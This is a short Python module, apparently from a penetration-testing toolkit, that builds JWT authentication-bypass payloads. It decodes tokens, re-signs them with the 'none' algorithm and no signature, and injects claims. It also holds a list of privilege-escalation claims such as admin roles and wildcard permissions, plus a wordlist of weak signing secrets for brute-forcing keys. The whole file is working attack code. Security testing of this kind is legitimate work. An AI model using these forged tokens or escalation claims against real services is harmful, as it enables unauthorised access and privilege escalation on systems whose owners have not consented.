"""Authentication bypass payloads — JWT manipulation, token analysis."""

from __future__ import annotations

import base64
import json
from typing import Any


def jwt_decode_parts(token: str) -> tuple[dict, dict, str]:
    """Decode a JWT token into (header, payload, signature)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    def _decode(s: str) -> dict:
        # Add padding
        padded = s + "=" * ((4 - len(s) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(padded))

    return _decode(parts[0]), _decode(parts[1]), parts[2]


def jwt_encode_unsigned(header: dict, payload: dict) -> str:
    """Create a JWT with alg=none (no signature)."""
    header = {**header, "alg": "none"}

    def _encode(d: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(d, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    return f"{_encode(header)}.{_encode(payload)}."


def jwt_none_algorithm(token: str) -> str:
    """Take a valid JWT and return it with alg=none and no signature."""
    header, payload, _ = jwt_decode_parts(token)
    return jwt_encode_unsigned(header, payload)


def jwt_modify_claims(token: str, new_claims: dict[str, Any]) -> str:
    """Modify JWT claims (unsigned). Useful for testing role escalation."""
    header, payload, _ = jwt_decode_parts(token)
    payload.update(new_claims)
    return jwt_encode_unsigned(header, payload)


# Common JWT claim modifications for privilege escalation
ESCALATION_CLAIMS: list[dict[str, Any]] = [
    {"role": "admin"},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"role": "superuser"},
    {"permissions": ["*"]},
    {"group": "administrators"},
    {"user_type": "admin"},
]

# Default passwords to try for JWT signing key brute-force
COMMON_JWT_SECRETS: list[str] = [
    "secret",
    "password",
    "123456",
    "key",
    "jwt_secret",
    "changeme",
    "admin",
    "test",
    "",
]
